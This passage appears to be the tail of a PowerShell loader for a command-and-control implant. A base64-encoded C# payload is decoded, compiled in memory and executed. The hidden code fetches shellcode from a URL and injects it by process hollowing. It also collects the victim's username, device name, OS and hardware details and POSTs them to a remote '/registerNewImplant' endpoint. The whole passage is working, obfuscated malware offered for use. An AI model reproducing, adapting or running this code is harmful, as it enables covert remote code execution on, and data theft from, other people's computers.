c2UgImxvYWRfc2hlbGxjb2RlIjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiTG9hZGluZyBjdXN0b20gc2hlbGxjb2RlIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIHVybCA9IGNvbW1hbmQuRmlsZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gc2hlbGxjb2RlID0gQ29kZUZldGNoLkZldGNoQ29kZSh1cmwpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNoZWxsY29kZUxvYWRlci5Qcm9jSG9sbG93KHNoZWxsY29kZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlVua25vd24gY29tbWFuZDogIiArIGlucHV0Q29tbWFuZCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsYXN0Q29tbWFuZEV4ZWN1dGVkID0gY29tbWFuZC5JbnB1dDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vQ29uc29sZS5Xcml0ZUxpbmUoZXguTWVzc2FnZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24pDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIFN5c3RlbS5UaHJlYWRpbmcuVGhyZWFkLlNsZWVwKDUwMDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgLy9Db25zb2xlLldyaXRlTGluZShlLk1lc3NhZ2UpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2VuZXJhdGVKc29uKCkNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIGlkID0gR2V0SW1wbGFudEluZm8uR2VuZXJhdGVSYW5kb21TdHJpbmcoNik7IC8vIEFzc3VtaW5nIHRoaXMgaXMgYSByYW5kb20gc3RyaW5nDQogICAgICAgICAgICBzdHJpbmcgZGV2aWNlTmFtZSA9IEdldEltcGxhbnRJbmZvLkdldENvbXB1dGVyTmFtZSgpOw0KICAgICAgICAgICAgc3RyaW5nIHVzZXJuYW1lID0gR2V0SW1wbGFudEluZm8uVXNlcm5hbWUoKTsNCiAgICAgICAgICAgIHN0cmluZyBvcGVyYXRpbmdTeXN0ZW0gPSBHZXRJbXBsYW50SW5mby5PcGVyYXRpbmdTeXN0ZW0oKTsNCiAgICAgICAgICAgIGludCByYW0gPSBHZXRJbXBsYW50SW5mby5SQU0oKTsgLy8gQXNzdW1pbmcgUkFNKCkgcmV0dXJucyBzb21ldGhpbmcgbGlrZSAiMTYgR0IiDQogICAgICAgICAgICBzdHJpbmcgY3B1ID0gR2V0SW1wbGFudEluZm8uQ1BVKCk7DQogICAgICAgICAgICBzdHJpbmcgZ3B1ID0gR2V0SW1wbGFudEluZm8uR1BVKCk7DQogICAgICAgICAgICBzdHJpbmcgc3RvcmFnZSA9IEdldEltcGxhbnRJbmZvLlN0b3JhZ2UoKTsNCiAgICAgICAgICAgIHN0cmluZyBuZXR3b3JrID0gR2V0SW1wbGFudEluZm8uTmV0d29yaygpLlJlcGxhY2UoIlxuIiwgIlxcbiIpLlJlcGxhY2UoIlxyIiwgIlxcciIpLlJlcGxhY2UoIlwiIiwgIlxcXCIiKTsNCiAgICAgICAgICAgIHN0cmluZyBjdXJyZW50RGF0ZSA9IEdldEltcGxhbnRJbmZvLkdldEN1cnJlbnREYXRlKCk7DQogICAgICAgICAgICBpbnQgb3BlcmF0b3JJZCA9IDE7DQoNCiAgICAgICAgICAgIHN0cmluZyBqc29uID0gIntcbiIgKw0KICAgICAgICAgICAgICAgICJcdFwiSURcIjogXCIiICsgaWQgKyAiXCIsXG4iICsNCiAgICAgICAgICAgICAgICAiXHRcIkRldmljZU5hbWVcIjogXCIiICsgZGV2aWNlTmFtZSArICJcIixcbiIgKw0KICAgICAgICAgICAgICAgICJcdFwiVXNlcm5hbWVcIjogXCIiICsgdXNlcm5hbWUgKyAiXCIsXG4iICsNCiAgICAgICAgICAgICAgICAiXHRcIk9wZXJhdG9ySURcIjogIiArIG9wZXJhdG9ySWQgKyAiLFxuIiArDQogICAgICAgICAgICAgICAgIlx0XCJDUFVBcmNoaXRlY3R1cmVcIjogXCIiICsgY3B1ICsgIlwiLFxuIiArDQogICAgICAgICAgICAgICAgIlx0XCJHUFVJbmZvXCI6IFwiIiArIGdwdSArICJcIixcbiIgKw0KICAgICAgICAgICAgICAgICJcdFwiUkFNSW5mb1wiOiAiICsgcmFtICsgIixcbiIgKw0KICAgICAgICAgICAgICAgICJcdFwiT1NOYW1lXCI6IFwiIiArIG9wZXJhdGluZ1N5c3RlbSArICJcIixcbiIgKw0KICAgICAgICAgICAgICAgICJcdFwiTmV0d29ya0luZm9cIjogXCIiICsgbmV0d29yayArICJcIixcbiIgKw0KICAgICAgICAgICAgICAgICJcdFwiQ3VycmVudERhdGVcIjogXCIiICsgY3VycmVudERhdGUgKyAiXCJcbiIgKw0KICAgICAgICAgICAgIn0iOw0KDQogICAgICAgICAgICByZXR1cm4ganNvbjsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgVmljdGltIEdldFZpY3RpbShWaWN0aW0gdmljdGltKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgaWQgPSBHZXRJbXBsYW50SW5mby5HZW5lcmF0ZVJhbmRvbVN0cmluZyg2KTsgLy8gQXNzdW1pbmcgdGhpcyBpcyBhIHJhbmRvbSBzdHJpbmcNCiAgICAgICAgICAgIHN0cmluZyBkZXZpY2VOYW1lID0gR2V0SW1wbGFudEluZm8uR2V0Q29tcHV0ZXJOYW1lKCk7DQogICAgICAgICAgICBzdHJpbmcgdXNlcm5hbWUgPSBHZXRJbXBsYW50SW5mby5Vc2VybmFtZSgpOw0KICAgICAgICAgICAgc3RyaW5nIG9wZXJhdGluZ1N5c3RlbSA9IEdldEltcGxhbnRJbmZvLk9wZXJhdGluZ1N5c3RlbSgpOw0KICAgICAgICAgICAgaW50IHJhbSA9IEdldEltcGxhbnRJbmZvLlJBTSgpOyAvLyBBc3N1bWluZyBSQU0oKSByZXR1cm5zIHNvbWV0aGluZyBsaWtlICIxNiBHQiINCiAgICAgICAgICAgIHN0cmluZyBjcHUgPSBHZXRJbXBsYW50SW5mby5DUFUoKTsNCiAgICAgICAgICAgIHN0cmluZyBncHUgPSBHZXRJbXBsYW50SW5mby5HUFUoKTsNCiAgICAgICAgICAgIHN0cmluZyBzdG9yYWdlID0gR2V0SW1wbGFudEluZm8uU3RvcmFnZSgpOw0KICAgICAgICAgICAgc3RyaW5nIG5ldHdvcmsgPSBHZXRJbXBsYW50SW5mby5OZXR3b3JrKCkuUmVwbGFjZSgiXG4iLCAiXFxuIikuUmVwbGFjZSgiXHIiLCAiXFxyIikuUmVwbGFjZSgiXCIiLCAiXFxcIiIpOw0KICAgICAgICAgICAgc3RyaW5nIGN1cnJlbnREYXRlID0gR2V0SW1wbGFudEluZm8uR2V0Q3VycmVudERhdGUoKTsNCiAgICAgICAgICAgIGludCBvcGVyYXRvcklkID0gMTsNCg0KICAgICAgICAgICAgdmljdGltLklEID0gaWQ7DQogICAgICAgICAgICB2aWN0aW0uVXNlcm5hbWUgPSB1c2VybmFtZTsNCiAgICAgICAgICAgIHZpY3RpbS5EZXZpY2VOYW1lID0gZGV2aWNlTmFtZTsNCiAgICAgICAgICAgIHZpY3RpbS5PcGVyYXRpbmdTeXN0ZW0gPSBvcGVyYXRpbmdTeXN0ZW07DQogICAgICAgICAgICB2aWN0aW0uQ1BVID0gY3B1Ow0KICAgICAgICAgICAgdmljdGltLkdQVSA9IGdwdTsNCiAgICAgICAgICAgIHZpY3RpbS5TdG9yYWdlID0gc3RvcmFnZTsNCiAgICAgICAgICAgIHZpY3RpbS5OZXR3b3JrID0gbmV0d29yazsNCiAgICAgICAgICAgIHZpY3RpbS5DdXJyZW50RGF0ZSA9IGN1cnJlbnREYXRlOw0KICAgICAgICAgICAgdmljdGltLlJBTSA9IHJhbTsNCiAgICAgICAgICAgIHZpY3RpbS5PcGVyYXRvcklEID0gb3BlcmF0b3JJZDsNCg0KICAgICAgICAgICAgcmV0dXJuIHZpY3RpbTsNCiAgICAgICAgfQ0KDQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUmVnaXN0ZXJJbXBsYW50KHN0cmluZyB2aWN0aW1fanNvbikNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIHJlc3BvbnNlID0gIiI7DQogICAgICAgICAgICB1c2luZyAodmFyIHdlYkNsaWVudCA9IG5ldyBXZWJDbGllbnQoKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB3ZWJDbGllbnQuSGVhZGVyc1tIdHRwUmVxdWVzdEhlYWRlci5Db250ZW50VHlwZV0gPSAiYXBwbGljYXRpb24vanNvbiI7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXNwb25zZSA9IHdlYkNsaWVudC5VcGxvYWRTdHJpbmcobmV3IFVyaSgiaHR0cDovLyIgKyBob3N0ICsgIjoiICsgcG9ydCArICIvcmVnaXN0ZXJOZXdJbXBsYW50IiksICJQT1NUIiwgdmljdGltX2pzb24pOw0KDQogICAgICAgICAgICAgICAgICAgIC8vIENoZWNrIGlmIHRoZSByZXNwb25zZSBjb250YWlucyAidG9rZW46ICINCiAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLlN0YXJ0c1dpdGgoInRva2VuOiAiKSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gRXh0cmFjdCB0aGUgdG9rZW4gcGFydA0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLlN1YnN0cmluZygidG9rZW46ICIuTGVuZ3RoKS5UcmltKCk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggKFdlYkV4Y2VwdGlvbikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIC8vIEhhbmRsZSB0aGUgZXhjZXB0aW9uIGFjY29yZGluZyB0byB5b3VyIG5lZWRzDQogICAgICAgICAgICAgICAgICAgIC8vQ29uc29sZS5Xcml0ZUxpbmUoIkVycm9yOiAiICsgZXguTWVzc2FnZSk7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgLy8gUmV0dXJuIHRoZSBmdWxsIHJlc3BvbnNlIG9yIGhhbmRsZSBhY2NvcmRpbmdseSBpZiB0aGUgZXhwZWN0ZWQgdG9rZW4gZm9ybWF0IGlzIG5vdCBmb3VuZA0KICAgICAgICAgICAgICAgIHJldHVybiByZXNwb25zZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgfQ0KfQ0K'
    $bytes = [Convert]::FromBase64String($encodedSource)
    $source = [System.Text.Encoding]::UTF8.GetString($bytes)
    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
    $compiler = $provider.CreateCompiler()
    $parameters = New-Object System.CodeDom.Compiler.CompilerParameters
    $parameters.GenerateInMemory = $True

    $parameters.ReferencedAssemblies.Add("System.dll") | Out-Null
    $parameters.ReferencedAssemblies.Add("System.Net.dll") | Out-Null
    $parameters.ReferencedAssemblies.Add("System.Net.Http.dll") | Out-Null
    
    Write-Host $source
    $results = $compiler.CompileAssemblyFromSource($parameters, $source)
    if ($results.Errors.Count -eq 0) {
        $assembly = $results.CompiledAssembly
        $method = $assembly.EntryPoint
        $method.Invoke($null, $null)
    } else {
        $results.Errors | % { Write-Host $_.ErrorText }
    }
}

Invoke-Run
